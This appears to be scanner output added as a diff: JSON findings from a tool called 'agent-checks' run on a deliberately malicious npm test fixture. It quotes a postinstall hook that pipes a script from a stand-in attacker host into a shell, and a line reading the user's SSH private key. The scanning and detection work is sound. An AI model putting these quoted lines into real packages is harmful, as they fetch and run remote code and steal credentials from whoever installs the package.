@@ -1,0 +1,125 @@
+{
+  "findings": [
+    {
+      "file": "scripts/setup.js",
+      "line": 5,
+      "meaning": "Accessing SSH keys, wallets, cookies or cloud creds is a hallmark of credential stealers.",
+      "remediation": "keep the secret out of the path that also reaches the network, or make that call opt-in",
+      "rule": "Code reads secrets/credentials near a network call",
+      "severity": "critical",
+      "snippet": "const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');",
+      "title": "Code reads secrets/credentials near a network call",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "package.json",
+      "line": 8,
+      "meaning": "npm runs this on `npm install` with your user's permissions.",
+      "remediation": "run `npm ci --ignore-scripts`, or review the script; `postinstall` runs automatically on every install",
+      "rule": "npm lifecycle script 'postinstall' runs automatically on install",
+      "severity": "critical",
+      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
+      "title": "npm lifecycle script 'postinstall' runs automatically on install",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "package.json",
+      "line": 8,
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts",
+      "rule": "Download-and-execute",
+      "severity": "high",
+      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
+      "title": "Download-and-execute (pipe to shell)",
+      "tool": "agent-checks"
+    }
+  ],
+  "meta": {
+    "capabilities": {
+      "environment": [],
+      "files": 3,
+      "filesystem": [
+        {
+          "count": 1,
+          "doc": false,
+          "file": "scripts/setup.js",
+          "line": 5,
+          "source": "static",
+          "test": false,
+          "value": ".ssh",
+          "verified": false
+        },
+        {
+          "count": 1,
+          "doc": false,
+          "file": "scripts/setup.js",
+          "line": 5,
+          "source": "static",
+          "test": false,
+          "value": "homedir()",
+          "verified": false
+        },
+        {
+          "count": 1,
+          "doc": false,
+          "file": "scripts/setup.js",
+          "line": 5,
+          "source": "static",
+          "test": false,
+          "value": "id_rsa",
+          "verified": false
+        }
+      ],
+      "network": [
+        {
+          "count": 1,
+          "doc": false,
+          "file": "package.json",
+          "line": 8,
+          "source": "static",
+          "test": false,
+          "value": "evil.example.invalid",
+          "verified": false
+        }
+      ],
+      "processes": [],
+      "storage": []
+    },
+    "commit": null,
+    "complete": true,
+    "coverage": {
+      "bytes_scanned": 590,
+      "bytes_scanned_pct": 100.0,
+      "bytes_total": 590,
+      "files_scanned": 3,
+      "files_total": 3,
+      "languages": {
+        "inspected": {
+          "JavaScript": 2
+        },
+        "no_rules": {}
+      },
+      "skipped": {
+        "archive": 0,
+        "binary": 0,
+        "oversize": 0,
+        "unreadable": 0,
+        "unsupported": 0
+      },
+      "unscanned_extensions": []
+    },
+    "fetched_via": "local path (copied)",
+    "files": 3,
+    "mode": "local (no docker)",
+    "pii_redacted": true,
+    "privacy_mode": "full",
+    "profile": "balanced",
+    "ref": null,
+    "ruleset": "92559dde022f",
+    "suppressed": 0,
+    "suppressions": [],
+    "target": "tests/fixtures/trap-npm"
+  },
+  "privacy_summary": {},
+  "version": "1.194.0"
+}
